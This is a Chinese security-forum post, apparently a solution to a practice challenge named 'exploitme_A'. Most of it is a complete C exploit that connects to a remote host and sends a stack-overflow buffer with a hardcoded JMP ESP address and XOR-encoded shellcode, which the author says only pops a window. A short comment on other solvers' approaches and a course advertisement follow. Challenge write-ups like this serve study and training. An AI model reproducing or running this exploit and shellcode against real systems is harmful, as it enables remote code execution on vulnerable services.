
# [原创]我的exploitme_A答案

没什么好说的

`SHELLCODE`是我早期自己写的 还是弹窗口的 与`B`题一样.

`test.c`

```c
#include <winsock2.h>

#include <stdio.h>

#pragma comment(lib,"Ws2_32")

unsigned char shellcode[] =

//decode
"\xEB\x0E\x5A\x4A\x33\xC9\xB1\xF1\x80\x34\x0A\x97\xE2\xFA\xEB\x05"
"\xE8\xED\xFF\xFF\xFF"
//encode
"\x16\x7b\x2f\x9c\x97\x97\x7c\xd0\xc8\xf3\x36\xa7\x97\x97\x97\x1c"
"\xd7\x9b\x1c\xe7\x8b\x3a\x1c\xff\x9f\xfd\x95\xce\x7f\xd5\x97\x97"
"\x97\x75\x6e\xff\xa4\xa5\x97\x97\xff\xe2\xe4\xf2\xe5\xc3\x68\xc0"
"\x6f\x1c\x7f\x7f\xbc\x97\x97\x97\xa4\x57\xc7\xc0\xc0\xc7\x68\xc0"
"\x6b\xa4\x57\xc7\x68\xc0\x6f\x16\x53\x57\x9c\x97\x97\x7c\xce\x7f"
"\x23\x68\x68\x68\x19\xd9\x99\x7b\xe9\x4f\x75\xe4\x3f\x35\xda\x2b"
"\xf8\xfc\x97\xc6\xc1\x1c\xe2\xab\x1c\xe3\xb9\xef\x94\x62\xc1\x1c"
"\xe1\xb7\x94\x62\xa4\x5e\xde\xd6\x3a\x94\x52\xa4\x4c\x98\x29\x87"
"\xad\x41\xe3\x9f\x56\x5c\x9a\x94\x4d\xd7\x7c\x66\xac\x88\xe2\x70"
"\xc9\x1c\xc9\xb3\x94\x4a\xf1\x1c\x9b\xdc\x1c\xc9\x8b\x94\x4a\x1c"
"\x93\x1c\x94\x52\x3c\xc9\xce\x54";

int main(int argc, char *argv[])
{
        WSADATA ws;
        SOCKET        s                = INVALID_SOCKET;
        int nLen                = 0;
        char buf[500]                = {0};
        struct sockaddr_in server;
        if (argc != 3)
        {
                printf("- Usage:%s Remote Port\n", argv[0]);
                return 0;
        }
        //初始化wsa
        WSAStartup(MAKEWORD(2,2),&ws);
        //建立socket
        s=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        //设置远程主机地址结构
        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[2]));
        server.sin_addr.s_addr = inet_addr(argv[1]);
        //连接远程计算机！
        if (connect(s,(struct sockaddr *)&server,sizeof(server) ) < 0)
        {
                printf("connect error");
                return -1;
        }
        memset(buf, '\x41', 500);
    memcpy(buf + 200, "\x12\x45\xfa\x7f", 4);        //JMP ESP
        memcpy(buf + 204, shellcode, 189);                //ShellCode
        //构造字符串后，发送
        nLen = sizeof(buf)-1;
        send(s, buf, nLen , 0);
        printf("send KyoCode Ok!");
        closesocket(s);
        WSACleanup();
        return 0;
}
```

看到其他几位的答案, 怎么觉得都较为麻烦啊.

其实就用我这样的最简单的代码 不一样可以成功吗

干吗要分2份`shellcode`??

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
